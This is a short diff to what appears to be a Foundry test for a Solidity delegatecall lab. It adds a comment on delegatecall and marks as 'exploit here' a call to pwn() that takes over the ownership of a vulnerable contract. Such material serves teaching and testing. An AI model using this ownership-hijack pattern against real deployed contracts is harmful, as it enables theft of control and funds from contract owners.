@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.13;
+pragma solidity ^0.8.15;
 
 import "forge-std/Test.sol";
 
@@ -18,7 +18,8 @@ function testDelegatecall() public {
     console.log("DelegateContract owner:",DelegateContract.owner());
     console.log("DelegationContract owner:",DelegationContract.owner());
     vm.prank(alice);   
-    address(DelegationContract).call(abi.encodeWithSignature("pwn()"));
+    // Delegatecall allows a smart contract to dynamically load code from a different address at runtime. 
+    address(DelegationContract).call(abi.encodeWithSignature("pwn()")); //exploit here
 
     console.log("DelegationContract owner changed",DelegationContract.owner());
     console.log("Exploit completed");
